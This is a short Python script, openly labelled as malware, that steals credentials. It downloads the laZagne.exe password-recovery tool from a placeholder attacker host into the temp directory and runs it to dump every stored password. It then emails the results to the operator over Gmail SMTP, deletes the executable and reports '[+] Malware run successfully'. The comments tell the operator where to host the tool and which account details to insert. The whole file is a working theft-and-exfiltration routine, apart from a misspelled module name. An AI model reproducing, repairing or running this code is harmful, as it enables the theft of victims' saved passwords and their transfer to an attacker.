#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url): #Get response from the target url
    getResponse = requests.get(url)
    fileName = url.split("/")[-1]
    with open(fileName, "wb") as out_file:
        out_file.write(getResponse.content)
        
def sendMail(email, password, message): #Use this to send data to mail
    server = smptlib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
        
tempDirectory = tempfile.gettempdir()
os.chdir(tempDirectory)
download("https://IPADDRESS/Files/laZagne.exe") #Download laZagne.exe from the google and save it in apache server and give the link here
result = subprocess.check_output("laZagne.exe all", shell=True)
sendMail("EMAIL", "PASSWORD", result) #USERNAME and PASSWORD of your gmail
os.remove("laZagne.exe")
print("[+] Malware run successfully")